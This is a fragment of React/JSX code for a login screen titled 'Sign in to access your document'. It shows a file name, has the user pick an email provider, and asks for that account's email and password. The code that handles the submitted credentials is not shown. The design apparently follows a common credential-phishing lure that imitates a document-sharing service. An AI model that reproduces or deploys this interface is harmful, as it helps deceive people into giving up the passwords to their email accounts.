      ...
      {!selectedProvider ? (
        <div className="flex-1 flex flex-col justify-center px-6 py-8">
          <div className="mb-8 text-center">
            ...
            <h1 className="text-lg font-semibold text-white mb-1">Sign in to access your document</h1>
            <p className="text-sm text-gray-400">
              <span className="font-medium text-gray-300">{fileName}</span>
            </p>
          </div>

          <p className="text-sm font-medium text-gray-300 mb-3">Choose your email provider</p>
        ...
        <div className="flex-1 flex flex-col justify-center px-6 py-8">
          <div className="mb-6 text-center">
            ...
            <h1 className="text-lg font-semibold text-white">Sign in with {selectedProvider}</h1>
            <p className="text-sm text-gray-400 mt-1">
              to access <span className="font-medium text-gray-300">{fileName}</span>
            </p>
          </div>

          <button onClick={handleBackToProviders} className="flex items-center gap-1.5 text-sm text-[#1473E6] active:text-[#4B9CF5] font-medium mb-5 transition-colors">
          ...
          <form onSubmit={handleSubmit} className="space-y-5">
            ...
            <div>
              ...
              <input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="you@example.com" required className="w-full px-3 py-3 rounded-md text-sm text-white outline-none transition placeholder:text-gray-500" style={{ backgroundColor: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }} onFocus={(e) => { e.currentTarget.style.borderColor = '#1473E6'; e.currentTarget.style.boxShadow = '0 0 0 2px rgba(20,115,230,0.3)'; }} onBlur={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)'; e.currentTarget.style.boxShadow = 'none'; }} />
            </div>
            <div>
              <label className="text-sm font-medium text-gray-300 block mb-1.5" htmlFor="password">Password</label>
              <div className="relative">
                <input id="password" type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full px-3 pr-10 py-3 rounded-md text-sm text-white outline-none transition placeholder:text-gray-500" style={{ backgroundColor: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.15)' }} onFocus={(e) => { e.currentTarget.style.borderColor = '#1473E6'; e.currentTarget.style.boxShadow = '0 0 0 2px rgba(20,115,230,0.3)'; }} onBlur={(e) => { e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)'; e.currentTarget.style.boxShadow = 'none'; }} />
